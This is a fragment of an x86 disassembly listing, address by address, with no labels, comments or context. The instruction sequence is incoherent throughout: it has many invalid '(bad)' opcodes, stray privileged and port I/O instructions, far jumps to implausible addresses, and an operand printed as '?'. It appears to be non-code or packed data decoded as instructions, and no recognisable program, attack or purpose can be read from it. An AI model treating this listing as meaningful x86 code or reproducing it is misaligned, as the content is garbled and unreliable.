  422543:	dec    eax
  422544:	inc    esp
  422545:	xor    ebx,DWORD PTR [edi]
  422547:	lea    edi,[edi-0x73]
  42254a:	push   ss
  42254b:	shr    BYTE PTR [eax+0xa9f2015],0x14
  422552:	push   cs
  422553:	xlat   BYTE PTR ds:[ebx]
  422554:	add    eax,0x1570f7d0
  422559:	mov    DWORD PTR [eax+0x5b],esp
  42255c:	adc    ebp,DWORD PTR [esp+ebx*8]
  42255f:	mov    edx,gs
  422561:	add    ch,BYTE PTR gs:[esi-0x48505c32]
  422568:	aad    0x5
  42256a:	pop    ss
  42256b:	aad    0x6
  42256d:	or     BYTE PTR [edi],bl
  42256f:	adc    edx,DWORD PTR [edx-0x3ad1e32]
  422575:	outs   dx,DWORD PTR ds:[esi]
  422576:	dec    esi
  422577:	aad    0x2e
  422579:	pop    ebp
  42257a:	clc    
  42257b:	imul   eax,DWORD PTR [ebx+0x4ca6eecb],0xffffffcb
  422582:	arpl   WORD PTR [ecx+0xc],bx
  422585:	mov    ebx,0x85e5027f
  42258a:	into   
  42258b:	mov    esp,DWORD PTR [edx]
  42258d:	sbb    al,0xee
  42258f:	test   eax,0x98ac3aaa
  422594:	cdq    
  422595:	jb     0x422533
  422597:	(bad)  [eax-0x38]
  42259a:	add    ah,dl
  42259c:	mov    BYTE PTR [ecx-0x6b],bh
  42259f:	mov    cl,0x55
  4225a1:	push   edi
  4225a2:	pop    edx
  4225a3:	retf   0x5a2
  4225a6:	retf   0x63b9
  4225a9:	rcl    DWORD PTR [edx+0x1ffe32b4],cl
  4225af:	aaa    
  4225b0:	fild   WORD PTR [eax-0x3625f9a8]
  4225b6:	dec    ecx
  4225b7:	les    esp,FWORD PTR [ebx+eax*1-0x68]
  4225bb:	(bad)  
  4225bc:	pushf  
  4225bd:	dec    ebx
  4225be:	rcl    BYTE PTR [esi],cl
  4225c0:	(bad)  
  4225c1:	addr16 pop ds
  4225c3:	mov    ecx,DWORD PTR [edx]
  4225c5:	add    edi,DWORD PTR [edi-0x231b3101]
  4225cb:	rcr    DWORD PTR [ecx+0x5cabec05],0x4a
  4225d2:	nop
  4225d3:	push   eax
  4225d4:	test   esp,ecx
  4225d6:	outs   dx,BYTE PTR ds:[esi]
  4225d7:	jnp    0x42257b
  4225d9:	sahf   
  4225da:	sbb    ebp,DWORD PTR [eax+0x15abfdae]
  4225e0:	(bad)  [edi-0x2]
  4225e3:	ret    
  4225e4:	pop    ecx
  4225e5:	add    ebp,eax
  4225e7:	mov    eax,0xcd23590e
  4225ec:	daa    
  4225ed:	mov    dh,0x6a
  4225ef:	scas   eax,DWORD PTR es:[edi]
  4225f0:	mov    esp,DWORD PTR [eax+0x29]
  4225f3:	jbe    0x422590
  4225f5:	imul   ebp,DWORD PTR ds:0x58192cbb,0x89810e15
  4225ff:	gs and al,0x24
  422602:	xor    edx,esp
  422604:	fwait
  422605:	in     eax,dx
  422606:	out    0xfc,al
  422608:	push   edi
  422609:	mov    esi,DWORD PTR [edi+0x6a]
  42260c:	mov    BYTE PTR [ebp-0x5fb974d6],ah
  422612:	test   ebx,eax
  422614:	es add ch,dh
  422617:	and    dh,bh
  422619:	ins    BYTE PTR es:[edi],dx
  42261a:	scas   al,BYTE PTR es:[edi]
  42261b:	cdq    
  42261c:	rcl    DWORD PTR [eax+edx*4-0x18ff74b1],cl
  422623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422624:	aaa    
  422625:	jle    0x4225c0
  422627:	mov    al,0x8
  422629:	cmp    eax,0xb71dd42b
  42262e:	adc    eax,ebp
  422630:	sub    ebp,DWORD PTR [ebx]
  422632:	jmp    0x42269c
  422634:	mov    BYTE PTR [ebp-0x5e52f15a],dl
  42263a:	add    eax,0xfc14f86a
  42263f:	imul   ebp,ecx,0x4715e14e
  422645:	or     BYTE PTR [edi+0x5d],al
  422648:	mov    BYTE PTR [edi],ah
  42264a:	lfs    esi,FWORD PTR [ebp+0x5e]
  42264e:	inc    ebp
  42264f:	js     0x4225f7
  422651:	add    eax,0x830dbabe
  422656:	daa    
  422657:	mov    ds:0x176dbf86,al
  42265c:	jno    0x42264a
  42265e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42265f:	mov    edi,0x9395809
  422664:	adc    eax,0x29f34410
  422669:	popf   
  42266a:	bound  esi,QWORD PTR [ecx+0x370de9d8]
  422670:	sahf   
  422671:	les    esp,FWORD PTR [eax+0x5d]
  422674:	data16 cmp al,0xc7
  422677:	dec    ecx
  422678:	dec    eax
  422679:	mov    edi,0xaa0ed495
  42267e:	jg     0x4226da
  422680:	lods   eax,DWORD PTR ds:[esi]
  422681:	mov    edi,DWORD PTR [eax]
  422683:	adc    ecx,edi
  422685:	sub    ebx,DWORD PTR [edi+0x4f52b6d4]
  42268b:	call   0xb477:0xd70bec2c
  422692:	loopne 0x422671
  422694:	inc    ebx
  422695:	jg     0x4226c7
  422697:	or     al,0x89
  422699:	ins    DWORD PTR es:[edi],dx
  42269a:	imul   ebx,DWORD PTR [eax+0x3d],0x65
  42269e:	mov    ebp,ebx
  4226a0:	out    dx,al
  4226a1:	mov    ebx,edi
  4226a3:	ss mov cl,dh
  4226a6:	inc    edx
  4226a7:	mov    ebx,0xe487d811
  4226ac:	arpl   WORD PTR [ebx+edx*4],si
  4226af:	lds    ebx,FWORD PTR [ebx+0x2]
  4226b2:	push   ecx
  4226b3:	xor    bh,cl
  4226b5:	jbe    0x422692
  4226b7:	mov    eax,ds:0x408005e6
  4226bc:	dec    esi
  4226bd:	xchg   ebx,eax
  4226be:	inc    eax
  4226bf:	mov    DWORD PTR es:[eax-0x2179c9a],ecx
  4226c6:	push   ecx
  4226c7:	(bad)  
  4226c8:	std    
  4226c9:	add    eax,0xf1e596a
  4226ce:	dec    edx
  4226cf:	xchg   ecx,eax
  4226d0:	ds push eax
  4226d2:	push   ds
  4226d3:	and    DWORD PTR [ebx-0x4bb79c08],ebx
  4226d9:	mov    ch,0x5c
  4226db:	aam    0xce
  4226dd:	mov    ebx,0x6cbd452d
  4226e2:	add    eax,0x1078953
  4226e7:	inc    ecx
  4226e8:	adc    eax,0x710190b1
  4226ed:	inc    esp
  4226ee:	dec    edx
  4226ef:	jbe    0x4226b5
  4226f1:	dec    ecx
  4226f2:	out    0x2c,al
  4226f4:	xchg   BYTE PTR [edx-0x79],bl
  4226f7:	push   ebp
  4226f8:	repnz imul ebp,DWORD PTR [edx-0x79],0xf91fa0b8
  422700:	repnz sub DWORD PTR [bx+di],0x76
  422705:	es mov edx,0xfbe46dd4
  42270b:	cmp    al,BYTE PTR [esi]
  42270d:	hlt    
  42270e:	iret   
  42270f:	dec    ecx
  422710:	mov    DWORD PTR [ebx],ecx
  422712:	sbb    DWORD PTR [ebx],eax
  422714:	sbb    al,0xf1
  422716:	fld    DWORD PTR [edx-0x796bfd60]
  42271c:	add    eax,DWORD PTR [edi-0x6b35122b]
  422722:	pusha  
  422723:	mov    ebp,0x112dfec
  422728:	sub    BYTE PTR [eax+0x53],cl
  42272b:	aad    0x1f
  42272d:	inc    edx
  42272e:	xor    ch,BYTE PTR [esi-0x77a0803e]
  422734:	mov    DWORD PTR [ebx+0x6981573f],edi
  42273a:	cdq    
  42273b:	mov    ss,WORD PTR [ecx-0x6832a76]
  422741:	cld    
  422742:	gs leave 
  422744:	(bad)  
  422745:	xor    eax,0xd158c62b
  42274a:	mov    ebx,0x93b78817
  42274f:	dec    ecx
  422750:	pushf  
  422751:	inc    ebp
  422752:	xchg   edx,eax
  422753:	js     0x4226e5
  422755:	add    eax,0x51d27cf8
  42275a:	or     BYTE PTR [edi+eax*1-0xd169f6d],cl
  422761:	xor    BYTE PTR [esi],0x88
  422764:	ds sub eax,0xd627d13d
  42276a:	data16 imul BYTE PTR [ebp+ebp*2-0x7f]
  42276f:	in     al,0xb8
  422771:	mov    bl,0x15
  422773:	mov    esi,0xc1626588
  422778:	sub    BYTE PTR ds:0x338b0b2,al
  42277e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42277f:	inc    edi
  422780:	push   0xd62f724
  422785:	aad    0x60
  422787:	aas    
  422788:	add    ebx,DWORD PTR [esi]
  42278a:	adc    dh,dh
  42278c:	adc    al,ch
  42278e:	pop    eax
  42278f:	aam    0xf0
  422791:	mov    edx,0x5447e29b
  422796:	sbb    esi,edx
  422798:	xchg   edi,eax
  422799:	jge    0x42271e
  42279b:	mov    DWORD PTR [edi-0x3d],eax
  42279e:	sar    BYTE PTR [edx+0x54],cl
  4227a1:	imul   edi,ebp,0xffffffd4
  4227a4:	pop    ecx
  4227a5:	or     eax,0x8ece956
  4227aa:	scas   al,BYTE PTR es:[edi]
  4227ab:	pusha  
  4227ac:	test   eax,0xa7d39c48
  4227b1:	add    eax,0xcd9a52db
  4227b6:	sbb    eax,0x7002cbdf
  4227bb:	sbb    ah,BYTE PTR [eax-0x59]
  4227be:	pop    edx
  4227bf:	test   eax,0x1b1fa1d4
  4227c4:	gs dec esp
  4227c6:	jp     0x4227b1
  4227c8:	cli    
  4227c9:	lock inc eax
  4227cb:	stos   DWORD PTR es:[edi],eax
  4227cc:	mov    dl,BYTE PTR [ebx]
  4227ce:	jmp    0x6f255665
  4227d3:	test   eax,0xcf6283a3
  4227d8:	mov    ds:0x73241090,al
  4227dd:	shl    al,0x6a
  4227e0:	fld    QWORD PTR [edx-0x1244c3ec]
  4227e6:	push   ebx
  4227e7:	xor    DWORD PTR [edi+0x17418fa5],0x49
  4227ee:	in     eax,dx
  4227ef:	xchg   ebp,eax
  4227f0:	push   0xe09c8c53
  4227f5:	add    dh,bl
  4227f7:	sbb    al,0x57
  4227f9:	mov    ds:0x823e134a,eax
  4227fe:	or     eax,0x111a84cd
  422803:	ins    BYTE PTR es:[edi],dx
  422804:	mov    ecx,ebp
  422806:	xor    al,0x23
  422808:	or     eax,0xdf777de1
  42280d:	add    ah,BYTE PTR [ebx+ecx*2+0x74]
  422811:	xchg   ebp,eax
  422812:	out    0x7,eax
  422814:	xor    cl,BYTE PTR [esi+ebx*4+0x4d2684f9]
  42281b:	jmp    0xbbacab3a
  422820:	sbb    edi,DWORD PTR [edx+0x5bccf74]
  422826:	add    BYTE PTR [ebx-0x29ee42d8],cl
  42282c:	pop    ds
  42282d:	popa   
  42282e:	or     dl,BYTE PTR [eax+ecx*4]
  422831:	aas    
  422832:	or     dh,ch
  422834:	or     BYTE PTR [ebp+0x63244d20],dh
  42283a:	clc    
  42283b:	inc    esi
  42283c:	cwde   
  42283d:	mov    esp,0xf988f2e4
  422842:	ins    BYTE PTR es:[edi],dx
  422843:	jle    0x4227f7
  422845:	enter  0xf8cd,0x9b
  422849:	add    dh,al
  42284b:	sub    al,0xa2
  42284d:	les    edx,FWORD PTR [eax+ecx*2-0x28]
  422851:	loopne 0x4228b3
  422853:	push   ebx
  422854:	cmp    BYTE PTR [edx],bl
  422856:	and    DWORD PTR [esi-0x3e],0x1b
  42285a:	xlat   BYTE PTR cs:[ebx]
  42285c:	adc    esp,esp
  42285e:	xchg   edi,eax
  42285f:	mov    bl,BYTE PTR [eax-0x40]
  422862:	sbb    DWORD PTR [esi-0x77],0x62f593b9
  422869:	mov    eax,ds:0x276aab79
  42286e:	push   esi
  42286f:	or     cl,dh
  422871:	sbb    edi,ebx
  422873:	nop
  422874:	adc    BYTE PTR [esi],0x1e
  422877:	mov    ah,0x48
  422879:	jae    0x42285a
  42287b:	jo     0x422806
  42287d:	jae    0x42287f
  42287f:	xchg   DWORD PTR [esi+edx*4-0x14ef0d81],edx
  422886:	cli    
  422887:	aam    0x18
  422889:	sub    al,0x16
  42288b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288c:	jge    0x4228dc
  42288e:	mov    eax,0x1d0b8949
  422893:	mov    ds:0x3a02aebe,eax
  422898:	pop    esi
  422899:	div    BYTE PTR [ebx+0x5b6932a3]
  42289f:	out    0x89,al
  4228a1:	pop    edx
  4228a2:	pushf  
  4228a3:	shl    BYTE PTR ds:0x42c91fef,cl
  4228a9:	int    0xe4
  4228ab:	mov    ds:0xd4fc0434,eax
  4228b0:	(bad)
  4228b3:	inc    BYTE PTR [edx-0x44]
  4228b6:	adc    ah,BYTE PTR [esi-0x77]
  4228b9:	pop    ss
  4228ba:	sub    ebx,DWORD PTR [ebx+eiz*4-0x4b]
  4228be:	adc    ecx,ebx
  4228c0:	pop    edx
  4228c1:	(bad)  
  4228c2:	in     eax,dx
  4228c3:	(bad)  [eax-0x3107647f]
  4228c9:	gs dec ebx
  4228cb:	dec    eax
  4228cc:	lea    eax,[ebp+0x54]
  4228cf:	mov    cl,0x6d
  4228d1:	push   esi
  4228d2:	push   ss
  4228d3:	aam    0xd8
  4228d5:	int3   
  4228d6:	dec    DWORD PTR [edi-0x11add05b]
  4228dc:	popf   
  4228dd:	sahf   
  4228de:	adc    BYTE PTR [eax],bl
  4228e0:	mov    al,0xb9
  4228e2:	pop    edi
  4228e3:	pop    edi
  4228e4:	add    DWORD PTR [esi+ecx*8+0x24],edi
  4228e8:	(bad)  
  4228e9:	fsubr  st,st(3)
  4228eb:	aam    0x2e
  4228ed:	std    
  4228ee:	inc    edi
  4228ef:	retf   
  4228f0:	inc    esi
  4228f1:	add    bl,BYTE PTR [edx-0x49]
  4228f4:	mov    es,WORD PTR [ebp-0x73]
  4228f7:	cld    
  4228f8:	mov    ebx,0x89d50f1a
  4228fd:	mov    ds:0x1c13db13,eax
  422902:	push   ecx
  422903:	lahf   
  422904:	xchg   esi,eax
  422905:	cmp    al,0x42
  422907:	sub    al,0xf7
  422909:	add    eax,0xda869bc2
  42290e:	nop
  42290f:	jp     0x42289f
  422911:	cmp    esp,0xb80b6c0e
  422917:	push   0xffffff89
  422919:	out    0xcc,eax
  42291b:	dec    edx
  42291c:	jnp    0x422920
  42291e:	lods   al,BYTE PTR ds:[esi]
  42291f:	mov    edi,0xb78f5020
  422924:	jle    0x422947
  422926:	aas    
  422927:	jnp    0x4228b2
  422929:	fwait
  42292a:	jmp    0x422930
  42292c:	xor    al,0xcb
  42292e:	pop    ecx
  42292f:	lds    esi,FWORD PTR [ebx+0xb]
  422932:	fnstcw WORD PTR [ebx]
  422934:	xor    ch,0x6e
  422937:	aad    0x61
  422939:	loop   0x4228bf
  42293b:	pushf  
  42293c:	loopne 0x422952
  42293e:	aam    0xd0
  422940:	stos   BYTE PTR es:[edi],al
  422941:	inc    edi
  422942:	or     ch,0x5d
  422945:	outs   dx,DWORD PTR ds:[esi]
  422946:	and    DWORD PTR [ecx-0x47],eax
  422949:	fst    QWORD PTR [eax+ebp*8]
  42294c:	push   ecx
  42294d:	pop    ecx
  42294e:	fwait
  42294f:	sti    
  422950:	stc    
  422951:	daa    
  422952:	and    BYTE PTR [edx+edx*1],bh
  422955:	adc    DWORD PTR [edi+0x7032b12b],0xffffffc3
  42295c:	cld    
  42295d:	add    BYTE PTR [edx],bl
  42295f:	mov    eax,0xa3ffe926
  422964:	push   edx
  422965:	fwait
  422966:	cld    
  422967:	mov    BYTE PTR ss:[ebp-0x5a],bl
  42296b:	push   ss
  42296c:	jnp    0x422961
  42296e:	imul   eax,DWORD PTR [edi-0x6331fa73],0xfffffff1
  422975:	pop    edi
  422976:	inc    ecx
  422977:	test   BYTE PTR [edi-0x67],bl
  42297a:	addr16 jns 0x422936
  42297d:	lahf   
  42297e:	cmp    DWORD PTR [eax],edi
  422980:	or     ecx,ebx
  422982:	sbb    DWORD PTR [edx],0x27
  422985:	inc    edi
  422986:	nop
  422987:	mov    ebp,0x561882ac
  42298c:	xchg   BYTE PTR [esi+0x7f89f03f],ch
  422992:	out    dx,al
  422993:	out    0x3c,al
  422995:	retf   
  422996:	pushf  
  422997:	cli    
  422998:	xchg   esi,eax
  422999:	add    eax,0x1f132f94
  42299e:	mov    dl,0x68
  4229a0:	sbb    al,0x23
  4229a2:	ins    BYTE PTR es:[edi],dx
  4229a3:	pop    ebp
  4229a4:	mov    bl,0x46
  4229a6:	dec    eax
  4229a7:	jmp    FWORD PTR [ecx-0x2a]
  4229aa:	pop    edi
  4229ab:	dec    ebx
  4229ac:	add    BYTE PTR [ebx+0x27d710d4],al
  4229b2:	lods   al,BYTE PTR ds:[esi]
  4229b3:	push   ebx
  4229b4:	fs retf 0x797e
  4229b8:	pop    ecx
  4229b9:	xor    eax,0xee31973b
  4229be:	sti    
  4229bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229c0:	call   0xe517e9d3
  4229c5:	fs jp  0x422972
  4229c8:	(bad)
  4229cd:	adc    eax,esi
  4229cf:	push   0x1c60a7b7
  4229d4:	add    DWORD PTR [edx],edi
  4229d6:	xor    ah,0x99
  4229d9:	add    eax,0x4447fe90
  4229de:	and    ebx,DWORD PTR [ecx+ebx*2+0x32]
  4229e2:	pop    ebp
  4229e3:	add    eax,0xe79fac07
  4229e8:	xchg   esi,eax
  4229e9:	sub    ecx,DWORD PTR [esi]
  4229eb:	mov    DWORD PTR [edx+0x6dede002],edi
  4229f1:	les    esp,FWORD PTR [edi-0x1e]
  4229f4:	dec    esi
  4229f5:	lahf   
  4229f6:	xor    al,0xc3
  4229f8:	stc    
  4229f9:	add    DWORD PTR [esi+edx*8],eax
  4229fc:	adc    ebp,DWORD PTR [eax]
  4229fe:	jg     0x42299a
  422a00:	push   es
  422a01:	and    BYTE PTR [ecx],al
  422a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a04:	js     0x422a67
  422a06:	or     dl,ah
  422a08:	test   DWORD PTR [ebx],ebx
  422a0a:	and    DWORD PTR [ebx+esi*8-0x77a2d67d],0x69887347
  422a15:	outs   dx,BYTE PTR ds:[esi]
  422a16:	pop    edi
  422a17:	(bad)  
  422a18:	mov    dh,0x1f
  422a1a:	dec    esp
  422a1b:	jl     0x4229ae
  422a1d:	das    
  422a1e:	cmp    eax,0x15eb19e0
  422a23:	arpl   WORD PTR [ecx-0x2bbe5d0d],cx
  422a29:	fmul   st(7),st
  422a2b:	pop    eax
  422a2c:	int3   
  422a2d:	xchg   bh,al
  422a2f:	cli    
  422a30:	mov    cl,0x59
  422a32:	cmp    al,0x5a
  422a34:	sti    
  422a35:	mov    ds:0x35addd1f,al
  422a3a:	jae    0x4229c6
  422a3c:	fwait
  422a3d:	push   0x18b44574
  422a42:	rcl    esp,cl
  422a44:	or     eax,DWORD PTR [ebx+0x7a]
  422a47:	repz xor DWORD PTR [edi-0x5c],eax
  422a4b:	rcr    dl,cl
  422a4d:	test   DWORD PTR [eax+0x53a27e68],esp
  422a53:	xlat   BYTE PTR ds:[ebx]
  422a54:	xchg   cl,al
  422a56:	fisttp WORD PTR [eax-0x2e20eb46]
  422a5c:	jo     0x422a14
  422a5e:	repz aam 0xcc
  422a61:	int3   
  422a62:	fdivr  DWORD PTR [edi+0x5e]
  422a65:	push   eax
  422a66:	ins    BYTE PTR es:[edi],dx
  422a67:	or     DWORD PTR [eax+0x52f48aaf],0xaac20c83
  422a71:	add    eax,0x6b379e62
  422a76:	in     al,dx
  422a77:	imul   eax,DWORD PTR [ecx-0xe1882f2],0xfee229c3
  422a81:	add    ah,BYTE PTR [ecx+ebx*4-0x62118a68]
  422a88:	out    dx,al
  422a89:	xchg   esp,eax
  422a8a:	fwait
  422a8b:	cmp    BYTE PTR [esi],bh
  422a8d:	cdq    
  422a8e:	popa   
  422a8f:	stos   BYTE PTR es:[edi],al
  422a90:	sahf   
  422a91:	aas    
  422a92:	mov    edi,0x6081be1c
  422a97:	rcl    DWORD PTR ds:0xdaa7e540,0x83
  422a9e:	sahf   
  422a9f:	aam    0xe
  422aa1:	mov    ecx,0x2fd15428
  422aa6:	add    BYTE PTR [edx+ecx*4+0x7e4ac8e9],dh
  422aad:	cli    
  422aae:	test   BYTE PTR [esi+0x58],bh
  422ab1:	rcl    DWORD PTR [eax+0x3fdfecd5],0x2d
  422ab8:	mov    al,ds:0x8e87c0dc
  422abd:	lods   eax,DWORD PTR ds:[esi]
  422abe:	pop    ebp
  422abf:	cdq    
  422ac0:	or     BYTE PTR [ecx-0xc91dc35],cl
  422ac6:	sub    dh,bh
  422ac8:	imul   eax,DWORD PTR [ecx],0xd8c18f40
  422ace:	push   esp
  422acf:	inc    edx
  422ad0:	xor    edx,DWORD PTR [ebx+0x378922d0]
  422ad6:	(bad)
  422ada:	push   ds
  422adb:	icebp  
  422adc:	pop    ebp
  422add:	add    cl,BYTE PTR [eax]
  422adf:	leave  
  422ae0:	mov    ds:0x1685f313,eax
  422ae5:	ret    
  422ae6:	pusha  
  422ae7:	lea    eax,[edi+ebp*2]
  422aea:	out    dx,eax
  422aeb:	xchg   edx,eax
  422aec:	ss pop ss
  422aee:	jnp    0x422aab
  422af0:	inc    ecx
  422af1:	fbstp  TBYTE PTR [esi+0x2f]
  422af4:	leave  
  422af5:	and    dl,al
  422af7:	push   ss
  422af8:	and    DWORD PTR [ecx+esi*2+0xe7c0c53],edi
  422aff:	stos   DWORD PTR es:[edi],eax
  422b00:	add    cl,BYTE PTR [ebp-0x216a5525]
  422b06:	pushf  
  422b07:	pop    ebx
  422b08:	daa    
  422b09:	mov    esp,0xe318f2c2
  422b0e:	enter  0x8906,0x61
  422b12:	sbb    esp,DWORD PTR [eax+ebp*8+0x3c]
  422b16:	push   esi
  422b17:	(bad)  
  422b18:	in     al,dx
  422b19:	add    eax,0xc0240d12
  422b1e:	xor    DWORD PTR [ebx],ebp
  422b20:	aaa    
  422b21:	ins    BYTE PTR es:[edi],dx
  422b22:	push   ds
  422b23:	stos   DWORD PTR es:[edi],eax
  422b24:	inc    esi
  422b25:	push   ecx
  422b26:	xor    bh,ch
  422b28:	jp     0x422b94
  422b2a:	sti    
  422b2b:	aad    0xf5
  422b2d:	pop    esp
  422b2e:	sub    ah,BYTE PTR [ecx]
  422b30:	xchg   ebp,eax
  422b31:	and    BYTE PTR [ebx-0x3b50776e],0x5e
  422b38:	push   ds
  422b39:	mov    cl,BYTE PTR [edx-0x57fa74e4]
  422b3f:	pop    ss
  422b40:	xor    ch,BYTE PTR [esi-0x3e]
  422b43:	mov    cl,0x6b
  422b45:	ds pop ds
  422b47:	add    DWORD PTR [esi+esi*4],esi
  422b4a:	pop    es
  422b4b:	cmp    eax,0xad3aa14a
  422b50:	lss    edi,FWORD PTR [ebx+0x26]
  422b54:	adc    DWORD PTR [ecx-0x693916c1],0x62
  422b5b:	rol    esp,1
  422b5d:	shr    edx,cl
  422b5f:	jmp    0x422b8c
  422b61:	mov    ds:0x1f34743f,eax
  422b66:	jb     0x422b19
  422b68:	rcr    DWORD PTR [edi+0x4c093c1c],cl
  422b6e:	or     ebp,edi
  422b70:	mov    DWORD PTR [ebx],edi
  422b72:	std    
  422b73:	repnz mov ecx,0xa683e595
  422b79:	out    dx,al
  422b7a:	mov    al,0xd4
  422b7c:	pop    ss
  422b7d:	mov    ah,0xb
  422b7f:	xchg   BYTE PTR [ebp+0x36],dh
  422b82:	cmc    
  422b83:	adc    esi,DWORD PTR [ebx+0x36ef9a29]
  422b89:	outs   dx,DWORD PTR ds:[esi]
  422b8a:	jp     0x422b96
  422b8c:	cmp    al,0xc2
  422b8e:	push   es
  422b8f:	in     eax,0xca
  422b91:	lods   eax,DWORD PTR ds:[esi]
  422b92:	mov    ss,ebp
  422b94:	inc    edi
  422b95:	push   0xca0af358
  422b9a:	adc    eax,0x98d18bba
  422b9f:	leave  
  422ba0:	or     eax,0x2012d5b6
  422ba5:	dec    ebx
  422ba6:	into   
  422ba7:	aad    0x57
  422ba9:	jbe    0x422ba4
  422bab:	mov    edx,0x758cd5ae
  422bb0:	inc    ebp
  422bb2:	(bad)  
  422bb3:	aam    0x6
  422bb5:	loope  0x422bc3
  422bb7:	pop    eax
  422bb8:	test   BYTE PTR [edx-0x7e64549f],0x8f
  422bbf:	aam    0xcb
  422bc1:	aaa    
  422bc2:	jae    0x422b58
  422bc4:	loop   0x422ba3
  422bc6:	(bad)  
  422bc7:	and    BYTE PTR [eax-0x27],ch
  422bca:	pop    esp
  422bcb:	jae    0x422c43
  422bcd:	sub    bl,BYTE PTR [edi+0x514cc914]
  422bd3:	call   FWORD PTR [ecx]
  422bd5:	adc    al,0x6
  422bd7:	xor    eax,0xdbcdb61d
  422bdc:	ja     0x422be1
  422bde:	loopne 0x422c56
  422be0:	les    eax,FWORD PTR [esi]
  422be2:	lods   eax,DWORD PTR ds:[esi]
  422be3:	add    dl,BYTE PTR [ecx+edx*1+0x664ae268]
  422bea:	cmp    al,0x56
  422bec:	cmp    DWORD PTR [esi],ebx
  422bee:	jmp    DWORD PTR [ecx]
  422bf0:	push   0x3c
  422bf2:	into   
  422bf3:	cmp    ah,ch
  422bf5:	sbb    al,0x14
  422bf7:	je     0x422bad
  422bf9:	leave  
  422bfa:	mov    dh,0x67
  422bfc:	jmp    0x88e227cd
  422c01:	jmp    0x161397b6
  422c06:	fcom   st(4)
  422c08:	sub    eax,DWORD PTR [edx]
  422c0a:	jo     0x422c3e
  422c0c:	mov    eax,ds:0x733ee791
  422c11:	in     eax,0x60
  422c13:	rcr    DWORD PTR [ebx],0xa8
  422c16:	and    BYTE PTR [eax-0x2a322a4c],al
  422c1c:	fdivr  DWORD PTR [ebx+0x7fe369ee]
  422c22:	ret    0x8e59
  422c25:	sti    
  422c26:	mov    ebp,0xf37542f3
  422c2b:	xor    al,0xd1
  422c2d:	mov    dl,0x87
  422c2f:	test   BYTE PTR [eax+0x2],0xaa
  422c33:	mov    BYTE PTR [esi],cl
  422c35:	mov    ?,WORD PTR [edi+0x36]
  422c38:	or     al,0xa6
  422c3a:	jge    0x422c85
  422c3c:	stos   BYTE PTR es:[edi],al
  422c3d:	hlt    
  422c3e:	jnp    0x422c7a
  422c40:	sub    BYTE PTR [ebx],al
  422c42:	ins    BYTE PTR es:[edi],dx
  422c43:	adc    DWORD PTR [ecx+ebp*8],edx
  422c46:	pop    esp
  422c47:	aad    0x37
  422c49:	dec    eax
  422c4a:	cdq    
  422c4b:	push   cs
  422c4c:	iret   
  422c4d:	sub    BYTE PTR [ebx],0x8b
  422c50:	xchg   bh,dh
  422c52:	dec    eax
  422c53:	cli    
  422c54:	xchg   edx,eax
  422c55:	rol    BYTE PTR [eax-0x626597ef],cl
  422c5b:	aad    0x7e
  422c5d:	aad    0x40
  422c5f:	loopne 0x422c11
  422c61:	mov    bl,0x32
  422c63:	(bad)
  422c68:	xor    bh,0x2c
  422c6b:	and    BYTE PTR [eax+ebp*8-0x30],bh
  422c6f:	aam    0x48
  422c71:	push   ecx
  422c73:	jnp    0x422c6b
  422c75:	sub    DWORD PTR [eax-0x13076fa],esi
  422c7b:	(bad)  [edx-0x6e21cbbd]
  422c81:	add    cl,dh
  422c83:	mov    al,0x94
  422c85:	outs   dx,BYTE PTR ds:[esi]
  422c86:	sub    BYTE PTR [edx+0x4f1fabfe],0xba
  422c8d:	or     edi,DWORD PTR [edi-0x25]
  422c90:	push   cs
  422c91:	push   ds
  422c92:	mov    al,0xd6
  422c94:	retf   0x5146
  422c97:	inc    eax
  422c98:	dec    esp
  422c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c9a:	std    
  422c9b:	neg    BYTE PTR [ecx]
  422c9d:	xchg   ebp,eax
  422c9e:	and    ah,0xa0
  422ca1:	ficomp WORD PTR [edi]
  422ca3:	std    
  422ca4:	xchg   edi,eax
  422ca5:	mov    cl,0xdf
  422ca7:	cmp    eax,0xd5740b4e
  422cac:	mov    ax,0xb732
  422cb0:	(bad)  
  422cb2:	cwde   
  422cb3:	retf   0xc989
  422cb6:	inc    esi
  422cb7:	mov    al,0xd3
  422cb9:	add    eax,DWORD PTR [eax]
  422cbb:	je     0x422ce4
  422cbd:	add    eax,DWORD PTR [ebx+eax*1-0x49]
  422cc1:	dec    esi
  422cc2:	sub    al,0x8
  422cc4:	adc    ebp,ebp
  422cc6:	or     dh,bl
  422cc8:	xchg   cl,al
  422cca:	and    eax,0x8e8430c6
  422ccf:	lock enter 0xe634,0x2b
  422cd4:	fadd   QWORD PTR ds:0xef553e3c
  422cda:	push   ebp
  422cdb:	mov    edx,0xbcbe16c7
  422ce0:	fwait
  422ce1:	test   eax,0x2459907
  422ce6:	(bad)
  422cea:	mov    cl,0xd5
  422cec:	and    al,0x74
  422cee:	aas    
  422cef:	push   cs
  422cf0:	aam    0x30
  422cf2:	or     esp,edx
  422cf4:	je     0x422d5b
  422cf6:	xchg   edi,eax
  422cf7:	dec    edi
  422cf8:	cld    
  422cf9:	loop   0x422d5b
  422cfb:	push   edi
  422cfc:	dec    bp
  422cfe:	cmp    ebp,DWORD PTR [edx+edi*1-0x232b8245]
  422d05:	cld    
  422d06:	mov    ebp,eax
  422d08:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d0a:	dec    esp
  422d0b:	sub    esi,DWORD PTR [esi-0x77d01321]
  422d11:	xchg   edx,eax
  422d12:	test   DWORD PTR [ecx],ecx
  422d14:	inc    di
  422d16:	pop    ss
  422d17:	aam    0xff
  422d19:	dec    esp
  422d1a:	mov    ebx,esp
  422d1c:	inc    ebp
  422d1d:	aam    0x1e
  422d1f:	pop    ebx
  422d20:	mov    WORD PTR [ebp+0x57],gs
  422d23:	pop    ebx
  422d24:	xchg   esp,eax
  422d25:	addr16 in eax,dx
  422d27:	push   esp
  422d28:	hlt    
  422d29:	cmp    DWORD PTR [edx-0x2c],eax
  422d2c:	call   0x9e3dbba8
  422d31:	sub    BYTE PTR [esi+0x3b],cl
  422d34:	xchg   esi,eax
  422d35:	add    DWORD PTR [eax+0x3b],ebp
  422d38:	inc    esp
  422d39:	inc    ebx
  422d3a:	ins    BYTE PTR es:[edi],dx
  422d3b:	dec    edi
